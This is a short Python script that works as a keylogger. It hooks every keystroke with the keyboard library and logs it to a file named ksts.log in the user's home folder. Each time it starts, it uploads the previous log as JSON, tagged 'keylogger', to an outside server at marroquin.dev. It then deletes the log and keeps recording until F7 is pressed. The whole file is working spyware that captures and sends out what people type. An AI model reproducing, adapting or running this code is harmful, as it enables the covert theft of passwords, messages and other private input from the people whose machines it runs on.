from functools import partial
from urllib import request
from pathlib import Path
import atexit
import json
import os

import keyboard

MAP = {
  "space": " ",
  "\r": "\n"
}

FILE_NAME = "{0}/ksts.log".format(str(Path.home()))
SEND_TO_REMOTE_SERVER = True
TERMINATE_KEY = "f7"

def callback(output, is_down, event):
  if event.event_type in ("up", "down"):
    key = MAP.get(event.name, event.name)
    modifier = len(key) > 1
    if not modifier and event.event_type == "down": # Capture only modifiers when keys are pressed
      return
    if modifier: # Avoid typing the same key multiple times if it is being pressed
      if event.event_type == "down":
        if is_down.get(key, False):
          return
        is_down[key] = True
      elif event.event_type == "up":
        is_down[key] = False
      key = " [{} ({})] ".format(key, event.event_type) # Indicate if the key is being pressed
    elif key == "\r":
      key = "\n" # Line break
    output.write(key) # Write the key to the output file
    output.flush() # Force write

def onexit(output):
  output.close()

def main():
  if SEND_TO_REMOTE_SERVER:
    if os.path.exists(FILE_NAME):
      file = open(FILE_NAME, "r").read()
      array_data = {
        "data": file,
        "type": "keylogger"
      }
      data = json.dumps(array_data).encode('utf8')
      req = request.Request(
        "https://marroquin.dev/api/tests",
        data=data,
        headers={
          'content-type': 'application/json'
        }
      )
      request.urlopen(req)
    try:
      if os.path.exists(FILE_NAME):
        os.remove(FILE_NAME) # Delete the old file
      is_down = {} # Indicates if a key is being pressed
      output = open(FILE_NAME, "a") # Output file
      atexit.register(onexit, output) # Close the file at the end of the program
      keyboard.hook(partial(callback, output, is_down)) # Install the keylogger
      keyboard.wait(TERMINATE_KEY) # Run until end key is pressed
    except PermissionError:
      print("File is probably being used by another process")

if __name__ == "__main__":
  main()
